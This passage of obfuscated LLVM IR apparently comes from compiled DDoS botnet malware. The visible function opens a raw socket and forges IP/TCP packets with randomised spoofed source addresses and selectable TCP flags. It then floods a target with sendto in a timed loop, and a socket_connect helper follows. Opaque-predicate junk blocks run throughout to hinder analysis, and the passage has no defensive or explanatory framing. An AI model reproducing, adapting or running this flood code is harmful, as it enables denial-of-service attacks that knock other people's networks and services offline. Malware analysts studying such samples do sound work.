  %382 = load i32, i32* @x.79
  %383 = load i32, i32* @y.80
  %384 = sub i32 %382, 1
  %385 = mul i32 %382, %384
  %386 = urem i32 %385, 2
  %387 = icmp eq i32 %386, 0
  %388 = icmp slt i32 %383, 10
  %389 = or i1 %387, %388
  br i1 %389, label %originalBB139, label %originalBB139alteredBB

originalBB139:                                    ; preds = %originalBB139alteredBB, %381
  %390 = load i32, i32* @x.79
  %391 = load i32, i32* @y.80
  %392 = sub i32 %390, 1
  %393 = mul i32 %390, %392
  %394 = urem i32 %393, 2
  %395 = icmp eq i32 %394, 0
  %396 = icmp slt i32 %391, 10
  %397 = or i1 %395, %396
  br i1 %397, label %originalBBpart2141, label %originalBB139alteredBB

originalBBpart2141:                               ; preds = %originalBB139
  br label %398

; <label>:398:                                    ; preds = %originalBBpart2141, %273
  %399 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.297, i32 0, i32 0)) #5
  store i8* %399, i8** %23, align 8
  br label %250

; <label>:400:                                    ; preds = %originalBBpart2125
  br label %401

; <label>:401:                                    ; preds = %400, %originalBBpart2121
  %402 = load i32, i32* @x.79
  %403 = load i32, i32* @y.80
  %404 = sub i32 %402, 1
  %405 = mul i32 %402, %404
  %406 = urem i32 %405, 2
  %407 = icmp eq i32 %406, 0
  %408 = icmp slt i32 %403, 10
  %409 = or i1 %407, %408
  br i1 %409, label %originalBB143, label %originalBB143alteredBB

originalBB143:                                    ; preds = %originalBB143alteredBB, %401
  %410 = call i32 @rand_cmwc()
  %411 = trunc i32 %410 to i16
  %412 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %413 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %412, i32 0, i32 0
  %414 = bitcast %union.anon* %413 to %struct.anon.0*
  %415 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %414, i32 0, i32 5
  store i16 %411, i16* %415, align 2
  %416 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %417 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %416, i32 0, i32 0
  %418 = bitcast %union.anon* %417 to %struct.anon.0*
  %419 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %418, i32 0, i32 6
  store i16 0, i16* %419, align 4
  %420 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %421 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %420, i32 0, i32 0
  %422 = bitcast %union.anon* %421 to %struct.anon.0*
  %423 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %422, i32 0, i32 7
  store i16 0, i16* %423, align 2
  %424 = load i32, i32* %9, align 4
  %425 = icmp eq i32 %424, 0
  %426 = load i32, i32* @x.79
  %427 = load i32, i32* @y.80
  %428 = sub i32 %426, 1
  %429 = mul i32 %426, %428
  %430 = urem i32 %429, 2
  %431 = icmp eq i32 %430, 0
  %432 = icmp slt i32 %427, 10
  %433 = or i1 %431, %432
  br i1 %433, label %originalBBpart2145, label %originalBB143alteredBB

originalBBpart2145:                               ; preds = %originalBB143
  br i1 %425, label %434, label %436

; <label>:434:                                    ; preds = %originalBBpart2145
  %435 = call i32 @rand_cmwc()
  br label %441

; <label>:436:                                    ; preds = %originalBBpart2145
  %437 = load i32, i32* %9, align 4
  %438 = trunc i32 %437 to i16
  %439 = call zeroext i16 @htons(i16 zeroext %438) #10
  %440 = zext i16 %439 to i32
  br label %441

; <label>:441:                                    ; preds = %436, %434
  %442 = phi i32 [ %435, %434 ], [ %440, %436 ]
  %443 = trunc i32 %442 to i16
  %444 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %445 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %444, i32 0, i32 0
  %446 = bitcast %union.anon* %445 to %struct.anon.0*
  %447 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %446, i32 0, i32 1
  store i16 %443, i16* %447, align 2
  %448 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %449 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %450 = call zeroext i16 @tcpcsum(%struct.iphdr* %448, %struct.tcphdr* %449)
  %451 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %452 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %451, i32 0, i32 0
  %453 = bitcast %union.anon* %452 to %struct.anon.0*
  %454 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %453, i32 0, i32 6
  store i16 %450, i16* %454, align 4
  %455 = bitcast i8* %145 to i16*
  %456 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %457 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %456, i32 0, i32 2
  %458 = load i16, i16* %457, align 2
  %459 = zext i16 %458 to i32
  %460 = call zeroext i16 @csum(i16* %455, i32 %459)
  %461 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %462 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %461, i32 0, i32 7
  store i16 %460, i16* %462, align 2
  %463 = call i64 @time(i64* null) #5
  %464 = load i32, i32* %10, align 4
  %465 = sext i32 %464 to i64
  %466 = add nsw i64 %463, %465
  %467 = trunc i64 %466 to i32
  store i32 %467, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %468

; <label>:468:                                    ; preds = %570, %569, %441
  %469 = load i32, i32* @x.79
  %470 = load i32, i32* @y.80
  %471 = sub i32 %469, 1
  %472 = mul i32 %469, %471
  %473 = urem i32 %472, 2
  %474 = icmp eq i32 %473, 0
  %475 = icmp slt i32 %470, 10
  %476 = or i1 %474, %475
  br i1 %476, label %originalBB147, label %originalBB147alteredBB

originalBB147:                                    ; preds = %originalBB147alteredBB, %468
  %477 = load i32, i32* @x.79
  %478 = load i32, i32* @y.80
  %479 = sub i32 %477, 1
  %480 = mul i32 %477, %479
  %481 = urem i32 %480, 2
  %482 = icmp eq i32 %481, 0
  %483 = icmp slt i32 %478, 10
  %484 = or i1 %482, %483
  br i1 %484, label %originalBBpart2149, label %originalBB147alteredBB

originalBBpart2149:                               ; preds = %originalBB147
  br label %485

; <label>:485:                                    ; preds = %originalBBpart2149
  %486 = load i32, i32* %17, align 4
  %487 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %488 = call i64 @sendto(i32 %486, i8* %145, i64 %143, i32 0, %struct.sockaddr* %487, i32 16)
  %489 = load i32, i32* %19, align 4
  %490 = call i32 @getRandomIP(i32 %489)
  %491 = call i32 @htonl(i32 %490) #10
  %492 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %493 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %492, i32 0, i32 8
  store i32 %491, i32* %493, align 4
  %494 = call i32 @rand_cmwc()
  %495 = trunc i32 %494 to i16
  %496 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %497 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %496, i32 0, i32 3
  store i16 %495, i16* %497, align 4
  %498 = call i32 @rand_cmwc()
  %499 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %500 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %499, i32 0, i32 0
  %501 = bitcast %union.anon* %500 to %struct.anon.0*
  %502 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %501, i32 0, i32 2
  store i32 %498, i32* %502, align 4
  %503 = call i32 @rand_cmwc()
  %504 = trunc i32 %503 to i16
  %505 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %506 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %505, i32 0, i32 0
  %507 = bitcast %union.anon* %506 to %struct.anon.0*
  %508 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %507, i32 0, i32 0
  store i16 %504, i16* %508, align 4
  %509 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %510 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %509, i32 0, i32 0
  %511 = bitcast %union.anon* %510 to %struct.anon.0*
  %512 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %511, i32 0, i32 6
  store i16 0, i16* %512, align 4
  %513 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %514 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %515 = call zeroext i16 @tcpcsum(%struct.iphdr* %513, %struct.tcphdr* %514)
  %516 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %517 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %516, i32 0, i32 0
  %518 = bitcast %union.anon* %517 to %struct.anon.0*
  %519 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %518, i32 0, i32 6
  store i16 %515, i16* %519, align 4
  %520 = bitcast i8* %145 to i16*
  %521 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %522 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %521, i32 0, i32 2
  %523 = load i16, i16* %522, align 2
  %524 = zext i16 %523 to i32
  %525 = call zeroext i16 @csum(i16* %520, i32 %524)
  %526 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %527 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %526, i32 0, i32 7
  store i16 %525, i16* %527, align 2
  %528 = load i32, i32* %25, align 4
  %529 = load i32, i32* %15, align 4
  %530 = icmp eq i32 %528, %529
  br i1 %530, label %531, label %570

; <label>:531:                                    ; preds = %485
  %532 = load i32, i32* @x.79
  %533 = load i32, i32* @y.80
  %534 = sub i32 %532, 1
  %535 = mul i32 %532, %534
  %536 = urem i32 %535, 2
  %537 = icmp eq i32 %536, 0
  %538 = icmp slt i32 %533, 10
  %539 = or i1 %537, %538
  br i1 %539, label %originalBB151, label %originalBB151alteredBB

originalBB151:                                    ; preds = %originalBB151alteredBB, %531
  %540 = call i64 @time(i64* null) #5
  %541 = load i32, i32* %24, align 4
  %542 = sext i32 %541 to i64
  %543 = icmp sgt i64 %540, %542
  %544 = load i32, i32* @x.79
  %545 = load i32, i32* @y.80
  %546 = sub i32 %544, 1
  %547 = mul i32 %544, %546
  %548 = urem i32 %547, 2
  %549 = icmp eq i32 %548, 0
  %550 = icmp slt i32 %545, 10
  %551 = or i1 %549, %550
  br i1 %551, label %originalBBpart2153, label %originalBB151alteredBB

originalBBpart2153:                               ; preds = %originalBB151
  br i1 %543, label %552, label %569

; <label>:552:                                    ; preds = %originalBBpart2153
  %553 = load i32, i32* @x.79
  %554 = load i32, i32* @y.80
  %555 = sub i32 %553, 1
  %556 = mul i32 %553, %555
  %557 = urem i32 %556, 2
  %558 = icmp eq i32 %557, 0
  %559 = icmp slt i32 %554, 10
  %560 = or i1 %558, %559
  br i1 %560, label %originalBB155, label %originalBB155alteredBB

originalBB155:                                    ; preds = %originalBB155alteredBB, %552
  %561 = load i32, i32* @x.79
  %562 = load i32, i32* @y.80
  %563 = sub i32 %561, 1
  %564 = mul i32 %561, %563
  %565 = urem i32 %564, 2
  %566 = icmp eq i32 %565, 0
  %567 = icmp slt i32 %562, 10
  %568 = or i1 %566, %567
  br i1 %568, label %originalBBpart2157, label %originalBB155alteredBB

originalBBpart2157:                               ; preds = %originalBB155
  br label %573

; <label>:569:                                    ; preds = %originalBBpart2153
  store i32 0, i32* %25, align 4
  br label %468

; <label>:570:                                    ; preds = %485
  %571 = load i32, i32* %25, align 4
  %572 = add i32 %571, 1
  store i32 %572, i32* %25, align 4
  br label %468

; <label>:573:                                    ; preds = %originalBBpart2157
  %574 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %574)
  br label %575

; <label>:575:                                    ; preds = %573, %105, %83, %originalBBpart2
  %576 = load i32, i32* @x.79
  %577 = load i32, i32* @y.80
  %578 = sub i32 %576, 1
  %579 = mul i32 %576, %578
  %580 = urem i32 %579, 2
  %581 = icmp eq i32 %580, 0
  %582 = icmp slt i32 %577, 10
  %583 = or i1 %581, %582
  br i1 %583, label %originalBB159, label %originalBB159alteredBB

originalBB159:                                    ; preds = %originalBB159alteredBB, %575
  %584 = load i32, i32* @x.79
  %585 = load i32, i32* @y.80
  %586 = sub i32 %584, 1
  %587 = mul i32 %584, %586
  %588 = urem i32 %587, 2
  %589 = icmp eq i32 %588, 0
  %590 = icmp slt i32 %585, 10
  %591 = or i1 %589, %590
  br i1 %591, label %originalBBpart2161, label %originalBB159alteredBB

originalBBpart2161:                               ; preds = %originalBB159
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %44
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %61
  %592 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %593 = getelementptr inbounds [8 x i8], [8 x i8]* %592, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %593, i8 0, i64 8, i32 4, i1 false)
  %594 = call i32 @socket(i32 2, i32 3, i32 6) #5
  store i32 %594, i32* %17, align 4
  %595 = load i32, i32* %17, align 4
  %596 = icmp ne i32 %595, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %84
  store i32 1, i32* %18, align 4
  %597 = load i32, i32* %17, align 4
  %598 = bitcast i32* %18 to i8*
  %599 = call i32 @setsockopt(i32 %597, i32 0, i32 3, i8* %598, i32 4) #5
  %600 = icmp slt i32 %599, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %106
  %601 = load i32, i32* %14, align 4
  %602 = icmp eq i32 %601, 0
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %132
  %603 = load i32, i32* %12, align 4
  %604 = sext i32 %603 to i64
  %_ = sub i64 40, %604
  %gen = mul i64 %_, %604
  %_15 = sub i64 40, %604
  %gen16 = mul i64 %_15, %604
  %_17 = shl i64 40, %604
  %_18 = shl i64 40, %604
  %_19 = sub i64 40, %604
  %gen20 = mul i64 %_19, %604
  %605 = add i64 40, %604
  %606 = call i8* @llvm.stacksave()
  store i8* %606, i8** %20, align 8
  %607 = alloca i8, i64 %605, align 16
  %608 = bitcast i8* %607 to %struct.iphdr*
  store %struct.iphdr* %608, %struct.iphdr** %21, align 8
  %609 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %610 = bitcast %struct.iphdr* %609 to i8*
  %611 = getelementptr i8, i8* %610, i64 20
  %612 = bitcast i8* %611 to %struct.tcphdr*
  store %struct.tcphdr* %612, %struct.tcphdr** %22, align 8
  %613 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %614 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %615 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %614, i32 0, i32 0
  %616 = load i32, i32* %615, align 4
  %617 = load i32, i32* %19, align 4
  %618 = call i32 @getRandomIP(i32 %617)
  %619 = call i32 @htonl(i32 %618) #10
  %620 = load i32, i32* %12, align 4
  %621 = sext i32 %620 to i64
  %_21 = sub i64 0, 20
  %gen22 = add i64 %_21, %621
  %_23 = shl i64 20, %621
  %_24 = shl i64 20, %621
  %_25 = sub i64 20, %621
  %gen26 = mul i64 %_25, %621
  %622 = add i64 20, %621
  %623 = trunc i64 %622 to i32
  call void @makeIPPacket(%struct.iphdr* %613, i32 %616, i32 %619, i8 zeroext 6, i32 %623)
  %624 = call i32 @rand_cmwc()
  %625 = trunc i32 %624 to i16
  %626 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %627 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %626, i32 0, i32 0
  %628 = bitcast %union.anon* %627 to %struct.anon.0*
  %629 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %628, i32 0, i32 0
  store i16 %625, i16* %629, align 4
  %630 = call i32 @rand_cmwc()
  %631 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %632 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %631, i32 0, i32 0
  %633 = bitcast %union.anon* %632 to %struct.anon.0*
  %634 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %633, i32 0, i32 2
  store i32 %630, i32* %634, align 4
  %635 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %636 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %635, i32 0, i32 0
  %637 = bitcast %union.anon* %636 to %struct.anon.0*
  %638 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %637, i32 0, i32 3
  store i32 0, i32* %638, align 4
  %639 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %640 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %639, i32 0, i32 0
  %641 = bitcast %union.anon* %640 to %struct.anon.0*
  %642 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %641, i32 0, i32 4
  %643 = load i16, i16* %642, align 4
  %_27 = sub i16 %643, -241
  %gen28 = mul i16 %_27, -241
  %_29 = shl i16 %643, -241
  %_30 = sub i16 0, %643
  %gen31 = add i16 %_30, -241
  %_32 = shl i16 %643, -241
  %_33 = shl i16 %643, -241
  %_34 = shl i16 %643, -241
  %644 = and i16 %643, -241
  %_35 = shl i16 %644, 80
  %_36 = sub i16 %644, 80
  %gen37 = mul i16 %_36, 80
  %645 = or i16 %644, 80
  store i16 %645, i16* %642, align 4
  %646 = load i8*, i8** %11, align 8
  %647 = call i32 @strcmp(i8* %646, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.296, i32 0, i32 0)) #9
  %648 = icmp ne i32 %647, 0
  br label %originalBB14

originalBB41alteredBB:                            ; preds = %originalBB41, %195
  %649 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %650 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %649, i32 0, i32 0
  %651 = bitcast %union.anon* %650 to %struct.anon.0*
  %652 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %651, i32 0, i32 4
  %653 = load i16, i16* %652, align 4
  %_42 = sub i16 %653, -513
  %gen43 = mul i16 %_42, -513
  %_44 = shl i16 %653, -513
  %_45 = sub i16 %653, -513
  %gen46 = mul i16 %_45, -513
  %_47 = sub i16 0, %653
  %gen48 = add i16 %_47, -513
  %_49 = sub i16 0, %653
  %gen50 = add i16 %_49, -513
  %_51 = sub i16 %653, -513
  %gen52 = mul i16 %_51, -513
  %654 = and i16 %653, -513
  %_53 = sub i16 0, %654
  %gen54 = add i16 %_53, 512
  %_55 = sub i16 0, %654
  %gen56 = add i16 %_55, 512
  %_57 = sub i16 0, %654
  %gen58 = add i16 %_57, 512
  %_59 = sub i16 0, %654
  %gen60 = add i16 %_59, 512
  %_61 = sub i16 0, %654
  %gen62 = add i16 %_61, 512
  %_63 = sub i16 %654, 512
  %gen64 = mul i16 %_63, 512
  %655 = or i16 %654, 512
  store i16 %655, i16* %652, align 4
  %656 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %657 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %656, i32 0, i32 0
  %658 = bitcast %union.anon* %657 to %struct.anon.0*
  %659 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %658, i32 0, i32 4
  %660 = load i16, i16* %659, align 4
  %_65 = sub i16 0, %660
  %gen66 = add i16 %_65, -1025
  %_67 = sub i16 0, %660
  %gen68 = add i16 %_67, -1025
  %_69 = sub i16 0, %660
  %gen70 = add i16 %_69, -1025
  %_71 = sub i16 %660, -1025
  %gen72 = mul i16 %_71, -1025
  %_73 = sub i16 0, %660
  %gen74 = add i16 %_73, -1025
  %_75 = sub i16 %660, -1025
  %gen76 = mul i16 %_75, -1025
  %_77 = sub i16 0, %660
  %gen78 = add i16 %_77, -1025
  %661 = and i16 %660, -1025
  %_79 = sub i16 0, %661
  %gen80 = add i16 %_79, 1024
  %_81 = sub i16 %661, 1024
  %gen82 = mul i16 %_81, 1024
  %_83 = sub i16 %661, 1024
  %gen84 = mul i16 %_83, 1024
  %662 = or i16 %661, 1024
  store i16 %662, i16* %659, align 4
  %663 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %664 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %663, i32 0, i32 0
  %665 = bitcast %union.anon* %664 to %struct.anon.0*
  %666 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %665, i32 0, i32 4
  %667 = load i16, i16* %666, align 4
  %_85 = sub i16 %667, -257
  %gen86 = mul i16 %_85, -257
  %_87 = shl i16 %667, -257
  %_88 = sub i16 %667, -257
  %gen89 = mul i16 %_88, -257
  %668 = and i16 %667, -257
  %_90 = shl i16 %668, 256
  %_91 = sub i16 %668, 256
  %gen92 = mul i16 %_91, 256
  %669 = or i16 %668, 256
  store i16 %669, i16* %666, align 4
  %670 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %671 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %670, i32 0, i32 0
  %672 = bitcast %union.anon* %671 to %struct.anon.0*
  %673 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %672, i32 0, i32 4
  %674 = load i16, i16* %673, align 4
  %_93 = sub i16 0, %674
  %gen94 = add i16 %_93, -4097
  %_95 = shl i16 %674, -4097
  %_96 = sub i16 %674, -4097
  %gen97 = mul i16 %_96, -4097
  %675 = and i16 %674, -4097
  %_98 = sub i16 %675, 4096
  %gen99 = mul i16 %_98, 4096
  %_100 = shl i16 %675, 4096
  %_101 = sub i16 %675, 4096
  %gen102 = mul i16 %_101, 4096
  %676 = or i16 %675, 4096
  store i16 %676, i16* %673, align 4
  %677 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %678 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %677, i32 0, i32 0
  %679 = bitcast %union.anon* %678 to %struct.anon.0*
  %680 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %679, i32 0, i32 4
  %681 = load i16, i16* %680, align 4
  %_103 = sub i16 %681, -2049
  %gen104 = mul i16 %_103, -2049
  %_105 = sub i16 0, %681
  %gen106 = add i16 %_105, -2049
  %_107 = shl i16 %681, -2049
  %_108 = sub i16 %681, -2049
  %gen109 = mul i16 %_108, -2049
  %_110 = sub i16 %681, -2049
  %gen111 = mul i16 %_110, -2049
  %_112 = sub i16 %681, -2049
  %gen113 = mul i16 %_112, -2049
  %682 = and i16 %681, -2049
  %_114 = shl i16 %682, 2048
  %_115 = shl i16 %682, 2048
  %_116 = sub i16 0, %682
  %gen117 = add i16 %_116, 2048
  %_118 = sub i16 %682, 2048
  %gen119 = mul i16 %_118, 2048
  %683 = or i16 %682, 2048
  store i16 %683, i16* %680, align 4
  br label %originalBB41

originalBB123alteredBB:                           ; preds = %originalBB123, %250
  %684 = load i8*, i8** %23, align 8
  %685 = icmp ne i8* %684, null
  br label %originalBB123

originalBB127alteredBB:                           ; preds = %originalBB127, %293
  %686 = load i8*, i8** %23, align 8
  %687 = call i32 @strcmp(i8* %686, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.300, i32 0, i32 0)) #9
  %688 = icmp ne i32 %687, 0
  br label %originalBB127

originalBB131alteredBB:                           ; preds = %originalBB131, %321
  %689 = load i8*, i8** %23, align 8
  %690 = call i32 @strcmp(i8* %689, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.301, i32 0, i32 0)) #9
  %691 = icmp ne i32 %690, 0
  br label %originalBB131

originalBB135alteredBB:                           ; preds = %originalBB135, %349
  %692 = load i8*, i8** %23, align 8
  %693 = call i32 @strcmp(i8* %692, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.302, i32 0, i32 0)) #9
  %694 = icmp ne i32 %693, 0
  br label %originalBB135

originalBB139alteredBB:                           ; preds = %originalBB139, %381
  br label %originalBB139

originalBB143alteredBB:                           ; preds = %originalBB143, %401
  %695 = call i32 @rand_cmwc()
  %696 = trunc i32 %695 to i16
  %697 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %698 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %697, i32 0, i32 0
  %699 = bitcast %union.anon* %698 to %struct.anon.0*
  %700 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %699, i32 0, i32 5
  store i16 %696, i16* %700, align 2
  %701 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %702 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %701, i32 0, i32 0
  %703 = bitcast %union.anon* %702 to %struct.anon.0*
  %704 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %703, i32 0, i32 6
  store i16 0, i16* %704, align 4
  %705 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %706 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %705, i32 0, i32 0
  %707 = bitcast %union.anon* %706 to %struct.anon.0*
  %708 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %707, i32 0, i32 7
  store i16 0, i16* %708, align 2
  %709 = load i32, i32* %9, align 4
  %710 = icmp eq i32 %709, 0
  br label %originalBB143

originalBB147alteredBB:                           ; preds = %originalBB147, %468
  br label %originalBB147

originalBB151alteredBB:                           ; preds = %originalBB151, %531
  %711 = call i64 @time(i64* null) #5
  %712 = load i32, i32* %24, align 4
  %713 = sext i32 %712 to i64
  %714 = icmp sgt i64 %711, %713
  br label %originalBB151

originalBB155alteredBB:                           ; preds = %originalBB155, %552
  br label %originalBB155

originalBB159alteredBB:                           ; preds = %originalBB159, %575
  br label %originalBB159
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #4

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %3 = load i32, i32* @x.81
  %4 = load i32, i32* @y.82
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i16, align 2
  %14 = alloca %struct.hostent*, align 8
  %15 = alloca %struct.sockaddr_in, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  store i8* %0, i8** %12, align 8
  store i16 %1, i16* %13, align 2
  store i32 1, i32* %16, align 4
  %18 = load i8*, i8** %12, align 8
  %19 = call %struct.hostent* @gethostbyname(i8* %18)
  store %struct.hostent* %19, %struct.hostent** %14, align 8
  %20 = icmp eq %struct.hostent* %19, null
  %21 = load i32, i32* @x.81
  %22 = load i32, i32* @y.82
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %20, label %29, label %30

; <label>:29:                                     ; preds = %originalBBpart2
  store i32 0, i32* %11, align 4
  br label %61

; <label>:30:                                     ; preds = %originalBBpart2
  %31 = load %struct.hostent*, %struct.hostent** %14, align 8
  %32 = getelementptr inbounds %struct.hostent, %struct.hostent* %31, i32 0, i32 4
  %33 = load i8**, i8*** %32, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 0
  %35 = load i8*, i8** %34, align 8
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 2
  %37 = bitcast %struct.in_addr* %36 to i8*
  %38 = load %struct.hostent*, %struct.hostent** %14, align 8
  %39 = getelementptr inbounds %struct.hostent, %struct.hostent* %38, i32 0, i32 3
  %40 = load i32, i32* %39, align 4
  %41 = sext i32 %40 to i64
  call void @bcopy(i8* %35, i8* %37, i64 %41) #5
  %42 = load i16, i16* %13, align 2
  %43 = call zeroext i16 @htons(i16 zeroext %42) #10
  %44 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 1
  store i16 %43, i16* %44, align 2
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 0
  store i16 2, i16* %45, align 4
  %46 = call i32 @socket(i32 2, i32 1, i32 6) #5
  store i32 %46, i32* %17, align 4
  %47 = load i32, i32* %17, align 4
  %48 = bitcast i32* %16 to i8*
  %49 = call i32 @setsockopt(i32 %47, i32 6, i32 1, i8* %48, i32 4) #5
  %50 = load i32, i32* %17, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %30
  store i32 0, i32* %11, align 4
  br label %61

; <label>:53:                                     ; preds = %30
  %54 = load i32, i32* %17, align 4
  %55 = bitcast %struct.sockaddr_in* %15 to %struct.sockaddr*
  %56 = call i32 @connect(i32 %54, %struct.sockaddr* %55, i32 16)
  %57 = icmp eq i32 %56, -1
  br i1 %57, label %58, label %59

; <label>:58:                                     ; preds = %53
  store i32 0, i32* %11, align 4
  br label %61

; <label>:59:                                     ; preds = %53
  %60 = load i32, i32* %17, align 4
  store i32 %60, i32* %11, align 4
  br label %61

; <label>:61:                                     ; preds = %59, %58, %52, %29
  %62 = load i32, i32* @x.81
  %63 = load i32, i32* @y.82
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %61
  %70 = load i32, i32* %11, align 4
  %71 = load i32, i32* @x.81
  %72 = load i32, i32* @y.82
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBBpart24, label %originalBB1alteredBB

